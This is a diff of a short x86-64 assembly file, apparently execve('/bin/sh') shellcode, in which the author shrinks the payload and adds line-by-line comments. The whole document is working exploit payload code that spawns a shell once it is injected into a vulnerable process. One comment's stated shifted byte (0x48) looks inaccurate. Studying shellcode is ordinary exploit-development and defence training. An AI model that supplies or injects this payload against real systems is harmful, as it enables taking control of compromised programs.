@@ -1,14 +1,24 @@
+; David @InfinitelyManic
+;
 section .text
 	global _start
 
 _start:
-	xor     rdx, rdx
-	mov     qword rbx, '//bin/sh'
-	shr     rbx, 0x8
-	push    rbx
-	mov     rdi, rsp
-	push    rax
-	push    rdi
-	mov     rsi, rsp
-	mov     al, 0x3b
+	;xor   rdx, rdx
+	cdq				; rax = 0 is implied so edx is set to 0
+
+	mov	qword rbx, '//bin/sh'	; extra / to bring to 8 chars  
+	shr	rbx, 0x8		; shift off byte 0x48
+
+	push	rbx			; filename
+	mov	rdi, rsp		; 
+	push	rax			; nulls
+	push	rdi			; second portion 
+	mov	rsi, rsp		; execve struct
+
+;	mov al,	0x3b			; execve syscall  
+	push byte 0x3b
+	pop rax
+
 	syscall
+
